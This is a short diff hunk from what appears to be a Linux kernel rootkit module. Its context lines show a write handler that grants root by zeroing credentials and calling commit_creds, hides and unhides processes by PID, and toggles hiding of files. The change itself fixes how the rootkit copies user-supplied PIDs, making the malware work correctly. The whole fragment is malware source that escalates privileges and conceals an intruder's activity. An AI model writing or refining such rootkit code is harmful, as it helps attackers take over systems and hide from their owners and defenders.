@@ -167,7 +167,7 @@ static ssize_t rtkit_write(struct file *file, const char __user *buff, size_t co
 		(credentials->gid).val = (credentials->egid).val = 0;
 		commit_creds(credentials);
 	} else if (!strncmp(kernel_buff, "hp", MIN(2, count))) {//upXXXXXX hides process with given id
-		if (current_pid < MAX_PIDS) strncpy(pids_to_hide[current_pid++], buff+2, MIN(7, count-2));
+		if (current_pid < MAX_PIDS) copy_from_user(pids_to_hide[current_pid++], buff+2, MIN(7, count-2));
 	} else if (!strncmp(kernel_buff, "up", MIN(2, count))) {//unhides last hidden process
 		if (current_pid > 0) current_pid--;
 	} else if (!strncmp(kernel_buff, "thf", MIN(3, count))) {//toggles hide files in fs
